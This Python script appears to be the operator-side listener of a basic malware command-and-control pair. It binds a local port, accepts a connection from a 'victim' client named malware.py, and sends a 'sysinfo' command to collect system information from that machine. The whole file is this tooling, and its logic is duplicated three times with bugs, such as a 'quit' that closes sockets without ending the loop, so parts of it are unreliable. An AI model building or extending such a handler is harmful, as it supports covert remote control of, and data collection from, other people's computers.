#!/usr/bin/env python3

import socket

HOST = '127.0.0.1'
PORT = 31016



# Binding the socket and listening for connections
def bind_socket():
    try:
        global HOST
        global PORT
        global s
        print("Binding the Port: " + str(PORT))

        s.bind((HOST, PORT))
        s.listen()

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()

# Establish connection with a client (socket must be listening)
def socket_accept():
    conn, addr = s.accept()
    print("Connection has been established! |" + " IP " + addr[0] + " | Port" + str(addr[1]))
    send_commands(conn)

# Fuction that gets data from malware.py
# This time the fuction doesn't have access to the conn
def getData_sendToAll(conn):
    while True:
        data = conn.recv(1024)
        if data == b'end_of_sysinfo':
            break
        print (data, end='\n')
    print('end of getData_sendToAll', end='\n')

# Send commands to client/victim or a friend
def send_commands(conn):
    while True:
        cmd = input()

        print ('cmd = ' + cmd)

        # end the malware connection
        if cmd == 'quit':
            conn.send(str.encode(cmd))
            conn.close()
            s.close()

        if len(str.encode(cmd)) > 0:
            if cmd == 'sysinfo':
                conn.send(str.encode(cmd))
                getData_sendToAll(conn)

def main():
    try:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    except socket.error as msg:
        print("Socket creation error: " + str(msg))
        
    try:
        print("Binding the Port: " + str(PORT))

        s.bind((HOST, PORT))
        s.listen()

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()
        
    conn, addr = s.accept()
    print("Connection has been established! |" + " IP " + addr[0] + " | Port" + str(addr[1]))
    while True:
        cmd = input()

        print ('cmd = ' + cmd)

        # end the malware connection
        if cmd == 'quit':
            conn.send(str.encode(cmd))
            conn.close()
            s.close()

        if len(str.encode(cmd)) > 0:
            if cmd == 'sysinfo':
                conn.send(str.encode(cmd))
                getData_sendToAll(conn)
        


if __name__== "__main__":
    try:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    except socket.error as msg:
        print("Socket creation error: " + str(msg))
        
    try:
        print("Binding the Port: " + str(PORT))

        s.bind((HOST, PORT))
        s.listen()

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()
        
    conn, addr = s.accept()
    print("Connection has been established! |" + " IP " + addr[0] + " | Port" + str(addr[1]))
    while True:
        cmd = input()

        print ('cmd = ' + cmd)

        # end the malware connection
        if cmd == 'quit':
            conn.send(str.encode(cmd))
            conn.close()
            s.close()

        if len(str.encode(cmd)) > 0:
            if cmd == 'sysinfo':
                conn.send(str.encode(cmd))
                getData_sendToAll(conn)


